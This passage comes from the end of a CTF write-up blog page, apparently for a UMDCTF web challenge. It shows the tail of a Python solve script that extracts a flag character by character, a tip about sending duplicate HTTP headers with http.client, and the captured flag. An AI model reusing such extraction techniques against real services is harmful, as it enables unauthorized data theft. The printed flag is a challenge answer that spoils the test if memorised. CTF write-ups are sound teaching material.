</span></span><span style="display:flex;"><span>        flag <span style="color:#f92672">+=</span> char
</span></span><span style="display:flex;"><span>        print(flag)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> char <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;}&#34;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        position <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">.1</span>)  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    get_flag()
</span></span></code></pre></div><p>One thing to keep in mind is that pythons requests library uses a dictionary for headers, so multiple headers with the same key will name work. I used http.client instead</p>
<pre tabindex="0"><code>UMDCTF{ile5TVR4IM3NtTresbEAu}
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2025 <a href="http://localhost:1313/">CTF Writeups</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
